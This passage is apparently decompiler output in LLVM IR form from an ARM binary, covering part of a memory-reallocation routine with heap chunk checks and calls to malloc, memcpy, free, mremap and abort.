  br i1 %v2_13e78, label %dec_label_pc_13e80, label %dec_label_pc_13e8c

dec_label_pc_13e80:                               ; preds = %dec_label_pc_13e78
  %v0_13e80 = call i32 @free()
  store i32 %v0_13e80, i32* %r0.global-to-local, align 4
  %v0_13e84 = load i32, i32* @r6, align 4
  store i32 %v0_13e84, i32* @r4, align 4
  br label %dec_label_pc_141d8

dec_label_pc_13e8c:                               ; preds = %dec_label_pc_13e78
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_13e94 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 108) to i32*), align 4
  store i32 %v4_13e94, i32* @r4, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_13e94, i32* %r2.global-to-local, align 4
  %v4_13ea0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 68) to i32*), align 4
  store i32 %v4_13ea0, i32* %r1.global-to-local, align 4
  %v2_13ea4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_13ea4, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_13eac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_13eac)
  %v0_13eb8 = load i32, i32* @r4, align 4
  store i32 %v0_13eb8, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %r1.global-to-local, align 4
  %v4_13ec4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 16) to i32*), align 4
  store i32 ptrtoint (i32* @global_var_13ed0.603 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13ec4)
  %v0_13ed0 = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_13ed0, -32
  br i1 %tmp36, label %dec_label_pc_13ef4, label %dec_label_pc_13ed8

dec_label_pc_13ed8:                               ; preds = %dec_label_pc_13e8c
  store i32 62780, i32* %r2.global-to-local, align 4
  %v0_13edc = call i32 @__aeabi_read_tp()
  store i32 %v0_13edc, i32* %r0.global-to-local, align 4
  %v3_13ee0 = load i16, i16* @global_var_23424.488, align 2
  %v4_13ee0 = sext i16 %v3_13ee0 to i32
  store i32 %v4_13ee0, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_13eec = add i32 %v4_13ee0, %v0_13edc
  %v4_13eec = inttoptr i32 %v3_13eec to i32*
  store i32 12, i32* %v4_13eec, align 4
  br label %dec_label_pc_141d8

dec_label_pc_13ef4:                               ; preds = %dec_label_pc_13e8c
  %v1_13ef4 = add i32 %v0_13ed0, 11
  store i32 %v1_13ef4, i32* %r0.global-to-local, align 4
  %v0_13ef8 = load i32, i32* @r5, align 4
  %v1_13ef8 = add i32 %v0_13ef8, -4
  %v2_13ef8 = inttoptr i32 %v1_13ef8 to i32*
  %v3_13ef8 = load i32, i32* %v2_13ef8, align 4
  store i32 %v3_13ef8, i32* %r2.global-to-local, align 4
  %v2_13efc = icmp ugt i32 %v1_13ef4, 14
  %v7_13efc = icmp eq i32 %v1_13ef4, 15
  %v2_13f00 = xor i1 %v2_13efc, true
  %v3_13f00 = or i1 %v7_13efc, %v2_13f00
  br i1 %v3_13f00, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_13ef4
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_13ef4, %bb
  %v2_13f04 = xor i1 %v7_13efc, true
  %v3_13f04 = and i1 %v2_13efc, %v2_13f04
  br i1 %v3_13f04, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_13f04 = and i32 %v1_13ef4, -8
  store i32 %v5_13f04, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_13f08 = and i32 %v3_13ef8, 2
  %v2_13f08 = icmp eq i32 %v1_13f08, 0
  %v1_13f0c = add i32 %v0_13ef8, -8
  store i32 %v1_13f0c, i32* @sl, align 4
  %v1_13f10 = and i32 %v3_13ef8, -4
  store i32 %v1_13f10, i32* @r6, align 4
  br i1 %v2_13f08, label %dec_label_pc_13f18, label %dec_label_pc_140f0

dec_label_pc_13f18:                               ; preds = %bb29
  %v1_13f18 = load i32, i32* @sb, align 4
  %v3_13f18 = icmp ult i32 %v1_13f10, %v1_13f18
  br i1 %v3_13f18, label %dec_label_pc_13f24, label %bb30

bb30:                                             ; preds = %dec_label_pc_13f18
  store i32 %v1_13f10, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14088

dec_label_pc_13f24:                               ; preds = %dec_label_pc_13f18
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_13f2c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 64) to i32*), align 4
  store i32 %v4_13f2c, i32* %r0.global-to-local, align 4
  %v1_13f30 = add i32 %v4_13f2c, 44
  %v2_13f30 = inttoptr i32 %v1_13f30 to i32*
  %v3_13f30 = load i32, i32* %v2_13f30, align 4
  store i32 %v3_13f30, i32* %r3.global-to-local, align 4
  %v2_13f34 = add i32 %v1_13f10, %v1_13f0c
  store i32 %v2_13f34, i32* @r4, align 4
  %v9_13f38 = icmp eq i32 %v2_13f34, %v3_13f30
  %v1_13f3c = add i32 %v2_13f34, 4
  %v2_13f3c = inttoptr i32 %v1_13f3c to i32*
  %v3_13f3c = load i32, i32* %v2_13f3c, align 4
  store i32 %v3_13f3c, i32* %r1.global-to-local, align 4
  br i1 %v9_13f38, label %dec_label_pc_13f44, label %dec_label_pc_13f80

dec_label_pc_13f44:                               ; preds = %dec_label_pc_13f24
  %v1_13f44 = and i32 %v3_13f3c, -4
  %v2_13f48 = add i32 %v1_13f44, %v1_13f10
  store i32 %v2_13f48, i32* %r1.global-to-local, align 4
  %v1_13f4c = add i32 %v1_13f18, 16
  store i32 %v1_13f4c, i32* %r3.global-to-local, align 4
  %v3_13f50 = icmp ult i32 %v2_13f48, %v1_13f4c
  br i1 %v3_13f50, label %dec_label_pc_13fd4, label %dec_label_pc_13f58

dec_label_pc_13f58:                               ; preds = %dec_label_pc_13f44
  %v2_13f58 = sub i32 %v2_13f48, %v1_13f18
  %v1_13f5c = urem i32 %v3_13ef8, 2
  %v2_13f60 = add i32 %v1_13f18, %v1_13f0c
  store i32 %v2_13f60, i32* %r1.global-to-local, align 4
  %v2_13f64 = or i32 %v1_13f18, %v1_13f5c
  store i32 %v2_13f64, i32* %r2.global-to-local, align 4
  %v1_13f68 = or i32 %v2_13f58, 1
  store i32 %v1_13f68, i32* %r3.global-to-local, align 4
  store i32 %v0_13ef8, i32* @r4, align 4
  store i32 %v2_13f64, i32* %v2_13ef8, align 4
  %v0_13f74 = load i32, i32* %r1.global-to-local, align 4
  %v1_13f74 = load i32, i32* %r0.global-to-local, align 4
  %v2_13f74 = add i32 %v1_13f74, 44
  %v3_13f74 = inttoptr i32 %v2_13f74 to i32*
  store i32 %v0_13f74, i32* %v3_13f74, align 4
  %v0_13f78 = load i32, i32* %r3.global-to-local, align 4
  %v1_13f78 = load i32, i32* %r1.global-to-local, align 4
  %v2_13f78 = add i32 %v1_13f78, 4
  %v3_13f78 = inttoptr i32 %v2_13f78 to i32*
  store i32 %v0_13f78, i32* %v3_13f78, align 4
  br label %dec_label_pc_141bc

dec_label_pc_13f80:                               ; preds = %dec_label_pc_13f24
  %v1_13f80 = and i32 %v3_13f3c, -2
  %v2_13f84 = add i32 %v1_13f80, %v2_13f34
  store i32 %v2_13f84, i32* %r3.global-to-local, align 4
  %v1_13f88 = add i32 %v2_13f84, 4
  %v2_13f88 = inttoptr i32 %v1_13f88 to i32*
  %v3_13f88 = load i32, i32* %v2_13f88, align 4
  store i32 %v3_13f88, i32* %r3.global-to-local, align 4
  %v1_13f8c = urem i32 %v3_13f88, 2
  %v2_13f8c = icmp eq i32 %v1_13f8c, 0
  br i1 %v2_13f8c, label %dec_label_pc_13f94, label %dec_label_pc_13fd4

dec_label_pc_13f94:                               ; preds = %dec_label_pc_13f80
  %v1_13f94 = and i32 %v3_13f3c, -4
  store i32 %v1_13f94, i32* %r3.global-to-local, align 4
  %v2_13f98 = add i32 %v1_13f94, %v1_13f10
  store i32 %v2_13f98, i32* %r0.global-to-local, align 4
  %v3_13f9c = icmp ult i32 %v2_13f98, %v1_13f18
  br i1 %v3_13f9c, label %dec_label_pc_13fd4, label %dec_label_pc_13fa4

dec_label_pc_13fa4:                               ; preds = %dec_label_pc_13f94
  %v1_13fa4 = add i32 %v1_13f10, %v0_13ef8
  %v2_13fa4 = inttoptr i32 %v1_13fa4 to i32*
  %v3_13fa4 = load i32, i32* %v2_13fa4, align 4
  store i32 %v3_13fa4, i32* %r1.global-to-local, align 4
  %v1_13fa8 = add i32 %v3_13fa4, 12
  %v2_13fa8 = inttoptr i32 %v1_13fa8 to i32*
  %v3_13fa8 = load i32, i32* %v2_13fa8, align 4
  store i32 %v3_13fa8, i32* %r3.global-to-local, align 4
  %v9_13fac = icmp eq i32 %v3_13fa8, %v2_13f34
  %v1_13fb0 = add i32 %v2_13f34, 12
  %v2_13fb0 = inttoptr i32 %v1_13fb0 to i32*
  %v3_13fb0 = load i32, i32* %v2_13fb0, align 4
  store i32 %v3_13fb0, i32* %r2.global-to-local, align 4
  br i1 %v9_13fac, label %dec_label_pc_13fb8, label %dec_label_pc_13fc4

dec_label_pc_13fb8:                               ; preds = %dec_label_pc_13fa4
  %v1_13fb8 = add i32 %v3_13fb0, 8
  %v2_13fb8 = inttoptr i32 %v1_13fb8 to i32*
  %v3_13fb8 = load i32, i32* %v2_13fb8, align 4
  store i32 %v3_13fb8, i32* %r3.global-to-local, align 4
  %v9_13fbc = icmp eq i32 %v3_13fb8, %v2_13f34
  br i1 %v9_13fbc, label %dec_label_pc_13fc8, label %dec_label_pc_13fc4

dec_label_pc_13fc4:                               ; preds = %dec_label_pc_13fa4, %dec_label_pc_13fb8
  %v0_13fc4 = call i32 @abort()
  store i32 %v0_13fc4, i32* %r0.global-to-local, align 4
  %v0_13fc8.pre = load i32, i32* @r1, align 4
  %v1_13fc8.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_13fc8

dec_label_pc_13fc8:                               ; preds = %dec_label_pc_13fb8, %dec_label_pc_13fc4
  %v1_13fc8 = phi i32 [ %v3_13fb0, %dec_label_pc_13fb8 ], [ %v1_13fc8.pre, %dec_label_pc_13fc4 ]
  %v0_13fc8 = phi i32 [ %v3_13fa4, %dec_label_pc_13fb8 ], [ %v0_13fc8.pre, %dec_label_pc_13fc4 ]
  %v2_13fc8 = add i32 %v1_13fc8, 8
  %v3_13fc8 = inttoptr i32 %v2_13fc8 to i32*
  store i32 %v0_13fc8, i32* %v3_13fc8, align 4
  %v0_13fcc = load i32, i32* %r2.global-to-local, align 4
  %v1_13fcc = load i32, i32* %r1.global-to-local, align 4
  %v2_13fcc = add i32 %v1_13fcc, 12
  %v3_13fcc = inttoptr i32 %v2_13fcc to i32*
  store i32 %v0_13fcc, i32* %v3_13fcc, align 4
  %v1_14088.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14088

dec_label_pc_13fd4:                               ; preds = %dec_label_pc_13f44, %dec_label_pc_13f94, %dec_label_pc_13f80
  %v1_13fd4 = add i32 %v1_13f18, -7
  store i32 %v1_13fd4, i32* @r0, align 4
  %v0_13fd8 = call i32 @malloc()
  store i32 %v0_13fd8, i32* @r0, align 4
  store i32 %v0_13fd8, i32* %r1.global-to-local, align 4
  %v2_13fdc = icmp eq i32 %v0_13fd8, 0
  br i1 %v2_13fdc, label %bb31, label %dec_label_pc_13fe8

bb31:                                             ; preds = %dec_label_pc_13fd4
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_141bc

dec_label_pc_13fe8:                               ; preds = %dec_label_pc_13fd4
  %v1_13ff0.pre = load i32, i32* @r4, align 4
  %v1_13fe8 = add i32 %v0_13fd8, -4
  %v2_13fe8 = inttoptr i32 %v1_13fe8 to i32*
  %v3_13fe8 = load i32, i32* %v2_13fe8, align 4
  store i32 %v3_13fe8, i32* @r3, align 4
  %v1_13fec = add i32 %v0_13fd8, -8
  store i32 %v1_13fec, i32* @r7, align 4
  %v9_13ff0 = icmp eq i32 %v1_13fec, %v1_13ff0.pre
  br i1 %v9_13ff0, label %.thread2, label %dec_label_pc_14000

.thread2:                                         ; preds = %dec_label_pc_13fe8
  %v2_13ff4 = and i32 %v3_13fe8, -4
  store i32 %v2_13ff4, i32* %r3.global-to-local, align 4
  %v2_13ff8 = load i32, i32* @r6, align 4
  %v3_13ff8 = add i32 %v2_13ff8, %v2_13ff4
  store i32 %v3_13ff8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14088

dec_label_pc_14000:                               ; preds = %dec_label_pc_13fe8
  %v0_14000 = load i32, i32* @r6, align 4
  %v1_14000 = add i32 %v0_14000, -4
  store i32 %v1_14000, i32* @r2, align 4
  %v3_14004 = udiv i32 %v1_14000, 4
  store i32 %v3_14004, i32* @ip, align 4
  %tmp37 = and i32 %v1_14000, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_1400c = icmp ult i32 %v1_14000, 36
  %v3_1400c = or i1 %tmp38, %v2_1400c
  %v0_1401c = load i32, i32* @r5, align 4
  br i1 %v3_1400c, label %dec_label_pc_1401c, label %dec_label_pc_14010

dec_label_pc_14010:                               ; preds = %dec_label_pc_14000
  store i32 %v0_1401c, i32* @r1, align 4
  %v0_14014 = call i32 @memcpy()
  store i32 %v0_14014, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_1401c:                               ; preds = %dec_label_pc_14000
  %v1_1401c = inttoptr i32 %v0_1401c to i32*
  %v2_1401c = load i32, i32* %v1_1401c, align 4
  store i32 %v2_1401c, i32* %r3.global-to-local, align 4
  %v2_14020 = inttoptr i32 %v0_13fd8 to i32*
  store i32 %v2_1401c, i32* %v2_14020, align 4
  %v0_14024 = load i32, i32* @r5, align 4
  %v1_14024 = add i32 %v0_14024, 4
  %v2_14024 = inttoptr i32 %v1_14024 to i32*
  %v3_14024 = load i32, i32* %v2_14024, align 4
  store i32 %v3_14024, i32* %r3.global-to-local, align 4
  %v1_14028 = load i32, i32* %r1.global-to-local, align 4
  %v2_14028 = add i32 %v1_14028, 4
  %v3_14028 = inttoptr i32 %v2_14028 to i32*
  store i32 %v3_14024, i32* %v3_14028, align 4
  %v0_1402c = load i32, i32* @r5, align 4
  %v1_1402c = add i32 %v0_1402c, 8
  %v2_1402c = inttoptr i32 %v1_1402c to i32*
  %v3_1402c = load i32, i32* %v2_1402c, align 4
  store i32 %v3_1402c, i32* %r3.global-to-local, align 4
  %v0_14030 = load i32, i32* @ip, align 4
  %v1_14034 = load i32, i32* %r1.global-to-local, align 4
  %v2_14034 = add i32 %v1_14034, 8
  %v3_14034 = inttoptr i32 %v2_14034 to i32*
  store i32 %v3_1402c, i32* %v3_14034, align 4
  %tmp39 = icmp ult i32 %v0_14030, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_1403c

dec_label_pc_1403c:                               ; preds = %dec_label_pc_1401c
  %v0_1403c = load i32, i32* @r5, align 4
  %v1_1403c = add i32 %v0_1403c, 12
  %v2_1403c = inttoptr i32 %v1_1403c to i32*
  %v3_1403c = load i32, i32* %v2_1403c, align 4
  store i32 %v3_1403c, i32* %r3.global-to-local, align 4
  %v1_14040 = load i32, i32* %r1.global-to-local, align 4
  %v2_14040 = add i32 %v1_14040, 12
  %v3_14040 = inttoptr i32 %v2_14040 to i32*
  store i32 %v3_1403c, i32* %v3_14040, align 4
  %v0_14044 = load i32, i32* @r5, align 4
  %v1_14044 = add i32 %v0_14044, 16
  %v2_14044 = inttoptr i32 %v1_14044 to i32*
  %v3_14044 = load i32, i32* %v2_14044, align 4
  store i32 %v3_14044, i32* %r3.global-to-local, align 4
  %v0_14048 = load i32, i32* @ip, align 4
  %v1_1404c = load i32, i32* %r1.global-to-local, align 4
  %v2_1404c = add i32 %v1_1404c, 16
  %v3_1404c = inttoptr i32 %v2_1404c to i32*
  store i32 %v3_14044, i32* %v3_1404c, align 4
  %tmp40 = icmp ult i32 %v0_14048, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_14054

dec_label_pc_14054:                               ; preds = %dec_label_pc_1403c
  %v0_14054 = load i32, i32* @r5, align 4
  %v1_14054 = add i32 %v0_14054, 20
  %v2_14054 = inttoptr i32 %v1_14054 to i32*
  %v3_14054 = load i32, i32* %v2_14054, align 4
  store i32 %v3_14054, i32* %r3.global-to-local, align 4
  %v1_14058 = load i32, i32* %r1.global-to-local, align 4
  %v2_14058 = add i32 %v1_14058, 20
  %v3_14058 = inttoptr i32 %v2_14058 to i32*
  store i32 %v3_14054, i32* %v3_14058, align 4
  %v0_1405c = load i32, i32* @r5, align 4
  %v1_1405c = add i32 %v0_1405c, 24
  %v2_1405c = inttoptr i32 %v1_1405c to i32*
  %v3_1405c = load i32, i32* %v2_1405c, align 4
  store i32 %v3_1405c, i32* %r3.global-to-local, align 4
  %v1_14060 = load i32, i32* %r1.global-to-local, align 4
  %v2_14060 = add i32 %v1_14060, 24
  %v3_14060 = inttoptr i32 %v2_14060 to i32*
  store i32 %v3_1405c, i32* %v3_14060, align 4
  %v0_14064 = load i32, i32* @ip, align 4
  %v7_14064 = icmp eq i32 %v0_14064, 9
  br i1 %v7_14064, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_14054
  %v1_14068 = load i32, i32* @r5, align 4
  %v2_14068 = add i32 %v1_14068, 28
  %v3_14068 = inttoptr i32 %v2_14068 to i32*
  %v4_14068 = load i32, i32* %v3_14068, align 4
  store i32 %v4_14068, i32* %r3.global-to-local, align 4
  %v2_1406c = load i32, i32* %r1.global-to-local, align 4
  %v3_1406c = add i32 %v2_1406c, 28
  %v4_1406c = inttoptr i32 %v3_1406c to i32*
  store i32 %v4_14068, i32* %v4_1406c, align 4
  %v1_14070 = load i32, i32* @r5, align 4
  %v2_14070 = add i32 %v1_14070, 32
  %v3_14070 = inttoptr i32 %v2_14070 to i32*
  %v4_14070 = load i32, i32* %v3_14070, align 4
  store i32 %v4_14070, i32* %r3.global-to-local, align 4
  %v2_14074 = load i32, i32* %r1.global-to-local, align 4
  %v3_14074 = add i32 %v2_14074, 32
  %v4_14074 = inttoptr i32 %v3_14074 to i32*
  store i32 %v4_14070, i32* %v4_14074, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_14054, %dec_label_pc_1403c, %dec_label_pc_1401c, %dec_label_pc_14010, %bb32
  %v0_14078 = load i32, i32* @r5, align 4
  store i32 %v0_14078, i32* @r0, align 4
  %v0_1407c = call i32 @free()
  store i32 %v0_1407c, i32* %r0.global-to-local, align 4
  %v0_14080 = load i32, i32* @r7, align 4
  %v1_14080 = add i32 %v0_14080, 8
  store i32 %v1_14080, i32* @r4, align 4
  br label %dec_label_pc_141bc

dec_label_pc_14088:                               ; preds = %bb30, %.thread2, %dec_label_pc_13fc8
  %v0_1409c = phi i32 [ %v3_13ff8, %.thread2 ], [ %v1_13f10, %bb30 ], [ %v1_14088.pre, %dec_label_pc_13fc8 ]
  %v0_14088 = load i32, i32* @sb, align 4
  %v2_14088 = sub i32 %v0_1409c, %v0_14088
  store i32 %v2_14088, i32* %r1.global-to-local, align 4
  %v0_14090 = load i32, i32* @sl, align 4
  %v1_14090 = add i32 %v0_14090, 4
  %v2_14090 = inttoptr i32 %v1_14090 to i32*
  %v3_14090 = load i32, i32* %v2_14090, align 4
  %tmp41 = icmp ugt i32 %v2_14088, 15
  %v1_140b8 = urem i32 %v3_14090, 2
  store i32 %v1_140b8, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_140b8, label %dec_label_pc_14098

dec_label_pc_14098:                               ; preds = %dec_label_pc_14088
  %v2_1409c = or i32 %v1_140b8, %v0_1409c
  store i32 %v2_1409c, i32* %r3.global-to-local, align 4
  store i32 %v2_1409c, i32* %v2_14090, align 4
  %v0_140a4 = load i32, i32* @sl, align 4
  %v1_140a4 = load i32, i32* %r0.global-to-local, align 4
  %v2_140a4 = add i32 %v1_140a4, %v0_140a4
  store i32 %v2_140a4, i32* %r2.global-to-local, align 4
  %v1_140a8 = add i32 %v2_140a4, 4
  %v2_140a8 = inttoptr i32 %v1_140a8 to i32*
  %v3_140a8 = load i32, i32* %v2_140a8, align 4
  %v1_140ac = or i32 %v3_140a8, 1
  store i32 %v1_140ac, i32* %r3.global-to-local, align 4
  store i32 %v1_140ac, i32* %v2_140a8, align 4
  br label %dec_label_pc_140e8

dec_label_pc_140b8:                               ; preds = %dec_label_pc_14088
  %v2_140bc = add i32 %v0_14090, %v0_14088
  store i32 %v2_140bc, i32* %r0.global-to-local, align 4
  %v2_140c0 = or i32 %v1_140b8, %v0_14088
  store i32 %v2_140c0, i32* %r3.global-to-local, align 4
  %v1_140c4 = or i32 %v2_14088, 1
  store i32 %v1_140c4, i32* %r2.global-to-local, align 4
  store i32 %v2_140c0, i32* %v2_14090, align 4
  %v0_140cc = load i32, i32* %r2.global-to-local, align 4
  %v1_140cc = load i32, i32* %r0.global-to-local, align 4
  %v2_140cc = add i32 %v1_140cc, 4
  %v3_140cc = inttoptr i32 %v2_140cc to i32*
  store i32 %v0_140cc, i32* %v3_140cc, align 4
  %v0_140d0 = load i32, i32* %r0.global-to-local, align 4
  %v1_140d0 = load i32, i32* %r1.global-to-local, align 4
  %v2_140d0 = add i32 %v1_140d0, %v0_140d0
  store i32 %v2_140d0, i32* %r2.global-to-local, align 4
  %v1_140d4 = add i32 %v2_140d0, 4
  %v2_140d4 = inttoptr i32 %v1_140d4 to i32*
  %v3_140d4 = load i32, i32* %v2_140d4, align 4
  %v1_140d8 = or i32 %v3_140d4, 1
  store i32 %v1_140d8, i32* %r3.global-to-local, align 4
  store i32 %v1_140d8, i32* %v2_140d4, align 4
  %v0_140e0 = load i32, i32* %r0.global-to-local, align 4
  %v1_140e0 = add i32 %v0_140e0, 8
  store i32 %v1_140e0, i32* @r0, align 4
  %v0_140e4 = call i32 @free()
  store i32 %v0_140e4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_140e8

dec_label_pc_140e8:                               ; preds = %dec_label_pc_14098, %dec_label_pc_140b8
  %v0_140e8 = load i32, i32* @sl, align 4
  %v1_140e8 = add i32 %v0_140e8, 8
  store i32 %v1_140e8, i32* @r4, align 4
  br label %dec_label_pc_141bc

dec_label_pc_140f0:                               ; preds = %bb29
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %r1.global-to-local, align 4
  %v4_140f8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 64) to i32*), align 4
  store i32 %v4_140f8, i32* @r8, align 4
  %v2_140fc = inttoptr i32 %v1_13f0c to i32*
  %v3_140fc = load i32, i32* %v2_140fc, align 4
  store i32 %v3_140fc, i32* @r4, align 4
  %v1_14100 = add i32 %v4_140f8, 860
  %v2_14100 = inttoptr i32 %v1_14100 to i32*
  %v3_14100 = load i32, i32* %v2_14100, align 4
  %v1_14104 = add i32 %v3_140fc, 4
  %v1_14108 = add i32 %v3_14100, -1
  store i32 %v1_14108, i32* %r2.global-to-local, align 4
  %v2_1410c = add i32 %v1_14104, %v1_14108
  %v1_14110 = load i32, i32* @sb, align 4
  %v2_14110 = add i32 %v2_1410c, %v1_14110
  store i32 %v2_14110, i32* %r3.global-to-local, align 4
  %v2_14114 = sub i32 0, %v3_14100
  %v3_14114 = and i32 %v2_14110, %v2_14114
  store i32 %v3_14114, i32* @r7, align 4
  %v2_14118 = sub i32 %v3_14114, %v3_140fc
  store i32 %v2_14118, i32* @fp, align 4
  %v9_1411c = icmp eq i32 %v1_13f10, %v2_14118
  br i1 %v9_1411c, label %dec_label_pc_14190, label %dec_label_pc_14124

dec_label_pc_14124:                               ; preds = %dec_label_pc_140f0
  %v2_14124 = sub i32 %v1_13f0c, %v3_140fc
  store i32 %v2_14124, i32* %r0.global-to-local, align 4
  %v2_14128 = add i32 %v3_140fc, %v1_13f10
  store i32 %v2_14128, i32* %r1.global-to-local, align 4
  store i32 %v3_14114, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_14134 = call i32 @mremap(i32 %v2_14124, i32 %v2_14128, i32 %v3_14114, i32 1)
  store i32 %v4_14134, i32* %r0.global-to-local, align 4
  %v7_14138 = icmp eq i32 %v4_14134, -1
  br i1 %v7_14138, label %dec_label_pc_14184, label %dec_label_pc_14140

dec_label_pc_14140:                               ; preds = %dec_label_pc_14124
  %v1_14140 = load i32, i32* @r4, align 4
  %v2_14140 = add i32 %v1_14140, %v4_14134
  store i32 %v2_14140, i32* %r0.global-to-local, align 4
  %v0_14144 = load i32, i32* @fp, align 4
  %v1_14144 = or i32 %v0_14144, 2
  store i32 %v1_14144, i32* %r3.global-to-local, align 4
  %v2_14148 = add i32 %v2_14140, 4
  %v3_14148 = inttoptr i32 %v2_14148 to i32*
  store i32 %v1_14144, i32* %v3_14148, align 4
  %v0_1414c = load i32, i32* @r8, align 4
  %v1_1414c = add i32 %v0_1414c, 868
  %v2_1414c = inttoptr i32 %v1_1414c to i32*
  %v3_1414c = load i32, i32* %v2_1414c, align 4
  store i32 %v3_1414c, i32* %r3.global-to-local, align 4
  %v1_14150 = add i32 %v0_1414c, 880
  %v2_14150 = inttoptr i32 %v1_14150 to i32*
  %v3_14150 = load i32, i32* %v2_14150, align 4
  store i32 %v3_14150, i32* %r2.global-to-local, align 4
  %v0_14154 = load i32, i32* @r6, align 4
  %v2_14154 = sub i32 %v3_1414c, %v0_14154
  store i32 %v2_14154, i32* %r3.global-to-local, align 4
  %v1_14158 = load i32, i32* @r7, align 4
  %v2_14158 = add i32 %v1_14158, %v2_14154
  store i32 %v2_14158, i32* %r1.global-to-local, align 4
  %v1_1415c = add i32 %v0_1414c, 872
  %v2_1415c = inttoptr i32 %v1_1415c to i32*
  %v3_1415c = load i32, i32* %v2_1415c, align 4
  store i32 %v3_1415c, i32* %r3.global-to-local, align 4
  %v1_14164 = add i32 %v0_1414c, 884
  %v2_14164 = inttoptr i32 %v1_14164 to i32*
  %v3_14164 = load i32, i32* %v2_14164, align 4
  store i32 %v3_14164, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_14158, %v3_14150
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_14140
  store i32 %v2_14158, i32* %v2_14150, align 4
  %v0_1416c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_1416c.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_14140, %bb33
  %v1_1416c = phi i32 [ %v0_1414c, %dec_label_pc_14140 ], [ %v1_1416c.pre, %bb33 ]
  %v0_1416c = phi i32 [ %v2_14158, %dec_label_pc_14140 ], [ %v0_1416c.pre, %bb33 ]
  %v2_1416c = add i32 %v1_1416c, 868
  %v3_1416c = inttoptr i32 %v2_1416c to i32*
  store i32 %v0_1416c, i32* %v3_1416c, align 4
  %v0_14170 = load i32, i32* %r1.global-to-local, align 4
  %v1_14170 = load i32, i32* %r3.global-to-local, align 4
  %v2_14170 = add i32 %v1_14170, %v0_14170
  store i32 %v2_14170, i32* %r1.global-to-local, align 4
  %v1_14174 = load i32, i32* %r2.global-to-local, align 4
  %v0_14178 = load i32, i32* %r0.global-to-local, align 4
  %v1_14178 = add i32 %v0_14178, 8
  store i32 %v1_14178, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_14170, %v1_14174
  br i1 %tmp43, label %bb35, label %dec_label_pc_141bc

bb35:                                             ; preds = %bb34
  %v5_1417c = load i32, i32* @r8, align 4
  %v6_1417c = add i32 %v5_1417c, 884
  %v7_1417c = inttoptr i32 %v6_1417c to i32*
  store i32 %v2_14170, i32* %v7_1417c, align 4
  br label %dec_label_pc_141bc

dec_label_pc_14184:                               ; preds = %dec_label_pc_14124
  %v0_14184 = load i32, i32* @sb, align 4
  %v1_14184 = add i32 %v0_14184, 4
  store i32 %v1_14184, i32* %r3.global-to-local, align 4
  %v0_14188 = load i32, i32* @r6, align 4
  %v3_14188 = icmp ult i32 %v0_14188, %v1_14184
  br i1 %v3_14188, label %dec_label_pc_14198, label %dec_label_pc_14184.dec_label_pc_14190_crit_edge

dec_label_pc_14184.dec_label_pc_14190_crit_edge:  ; preds = %dec_label_pc_14184
  %v0_14190.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14190

dec_label_pc_14190:                               ; preds = %dec_label_pc_14184.dec_label_pc_14190_crit_edge, %dec_label_pc_140f0
  %v0_14190 = phi i32 [ %v0_14190.pre, %dec_label_pc_14184.dec_label_pc_14190_crit_edge ], [ %v0_13ef8, %dec_label_pc_140f0 ]
  store i32 %v0_14190, i32* @r4, align 4
  br label %dec_label_pc_141bc

dec_label_pc_14198:                               ; preds = %dec_label_pc_14184
  %v1_14198 = add i32 %v0_14184, -7
  store i32 %v1_14198, i32* @r0, align 4
  %v0_1419c = call i32 @malloc()
  store i32 %v0_1419c, i32* @r0, align 4
  store i32 %v0_1419c, i32* @r4, align 4
  %v2_141a0 = icmp eq i32 %v0_1419c, 0
  br i1 %v2_141a0, label %dec_label_pc_141bc, label %dec_label_pc_141a8

dec_label_pc_141a8:                               ; preds = %dec_label_pc_14198
  %v0_141a8 = load i32, i32* @r6, align 4
